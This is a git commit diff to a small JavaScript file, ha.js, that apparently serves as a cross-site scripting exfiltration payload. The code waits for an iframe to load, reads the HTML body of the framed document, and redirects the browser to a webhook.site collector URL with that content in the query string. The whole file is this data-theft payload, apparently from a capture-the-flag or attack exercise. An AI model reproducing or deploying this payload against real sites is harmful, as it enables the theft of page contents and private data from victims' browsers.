e702c338e812cee06dc5909828b3c969903f9ee1
filime <36452369+filime@users.noreply.github.com>
2023-04-22 16:06:57 +0900

    Update ha.js

--- ha.js
+++ ha.js
@@ -1,4 +1,5 @@
-ff.addEventListener('load', () => {
+const frame = document.querySelector('iframe');
+frame.addEventListener('load', () => {
   var a = document.getElementById('ff');
   location.href="https://webhook.site/6593dab1-9b07-4151-b85b-a6396b3d0a73?a="+a.contentDocument.children[0].children[1].innerHTML
 })
